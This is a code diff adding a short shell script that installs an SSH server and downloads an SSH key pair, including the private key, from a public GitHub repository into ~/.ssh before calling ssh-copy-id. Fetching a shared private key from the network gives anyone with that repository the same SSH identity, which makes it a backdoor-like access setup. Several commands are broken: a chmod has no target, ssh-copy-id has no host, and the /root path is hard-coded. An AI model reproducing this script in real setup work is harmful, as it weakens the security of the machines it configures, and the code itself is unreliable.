@@ -1,0 +1,10 @@
+apt update && apt-get install sudo -y
+apt-get install openssh-server -y
+sleep 5
+mkdir -p ~/.ssh
+cd ~/.ssh/
+chmod 700 ~/.ssh
+wget https://raw.githubusercontent.com/sarifadim/deplot/main/id_rsa.pub && chmod 700
+wget https://raw.githubusercontent.com/sarifadim/deplot/main/id_rsa && chmod 700
+ssh-copy-id -i ~/.ssh/id_rsa.pub
+chmod 700 /root/.ssh/id_rsa
